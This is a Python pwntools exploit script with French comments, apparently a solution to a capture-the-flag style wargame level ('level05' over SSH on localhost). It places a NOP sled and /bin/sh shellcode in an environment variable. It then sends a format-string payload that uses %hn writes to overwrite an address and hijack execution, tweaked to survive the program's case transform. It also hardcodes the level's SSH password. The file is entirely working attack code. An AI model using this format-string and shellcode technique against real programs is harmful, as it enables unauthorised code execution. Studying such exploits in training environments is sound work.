#!/usr/bin/env python3
from pwn import *
import base64
import os


# Configuration
context.arch = 'i386'  # Architecture du binaire (32-bit)
context.log_level = 'info'  # Niveau de log (debug, info, warning, error)

# Variables pour la connexion
LOCAL = False  # Mettre à False pour l'exploitation SSH
HOST = "localhost"  # Hôte pour SSH
PORT = 8881  # Port pour SSH
USER = "level05"  # Nom d'utilisateur SSH
PASSWORD = "3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN"  # Mot de passe SSH
SSH_SESSION = None


def get_connection(custom_env=None, argv=None):
    global SSH_SESSION
    # Fonction helper pour fusionner les environnements
    def merge_env(base_env, custom_env):
        if custom_env:
            base_env.update(custom_env)
        return base_env

    if LOCAL:
        # En local, on utilise l'environnement actuel comme base
        SSH_SESSION = None
        local_env = os.environ.copy()
        final_env = merge_env(local_env, custom_env)
        final_argv = argv if argv is not None else ['./Resources/' + USER]
        return process(final_argv, env=final_env)
    else:
        shell = ssh(host=HOST, port=PORT, user=USER, password=PASSWORD)
        SSH_SESSION = shell
        # Récupérer l'environnement distant
        remote_env = shell.run('env').recvall().decode().strip()
        # Convertir l'output en dictionnaire
        remote_env_dict = dict(line.split('=', 1) for line in remote_env.split('\n') if '=' in line)

        # Fusionner avec nos variables personnalisées 
        final_env = merge_env(remote_env_dict, custom_env)
        final_argv = argv if argv is not None else ['/home/users/' + USER + '/' + USER]
        log.info(f"Final argv: {final_argv}")
        return shell.process(final_argv, env=final_env)


def xore(data):
    # On s'assure que 'data' est un bytearray pour pouvoir le modifier (b"aa" → bytearray(b"aa"))
    if isinstance(data, bytes):
        data = bytearray(data)
    for i in range(len(data)):
        if data[i] > 64 and data[i] <= 90:
            data[i] ^= 32
    return bytes(data)


def exploit():

 

    
    shellcode = asm(shellcraft.i386.linux.sh())
    nop_slide = b"\x90" * 100
    paylod_env = nop_slide + shellcode 

    
    payload_arg = p32(0x80497e0) + p32(0x80497e0 + 2) \
    + b"%55408d" + b"%10$hn" \
    + b"%10119d" + b"%11$hn"
    
    print(payload_arg)

    payload_arg = xore(payload_arg)
    print(payload_arg)

    conn = get_connection(
        custom_env={
            "SHELLCODE": paylod_env
        }
    )

    if LOCAL:
        gdb.attach(conn, '''
          break *p+28
          continue
          ''')

    conn.sendline(payload_arg)
    print(payload_arg)


    if not LOCAL and SSH_SESSION is not None:
        SSH_SESSION.upload_data(payload_arg, "/tmp/payload")
        SSH_SESSION.upload_data(paylod_env, "/tmp/shellcode")
        print("Payloads uploaded to /tmp/payload and /tmp/shellcode on remote server.")


   
if __name__ == "__main__":
    exploit()


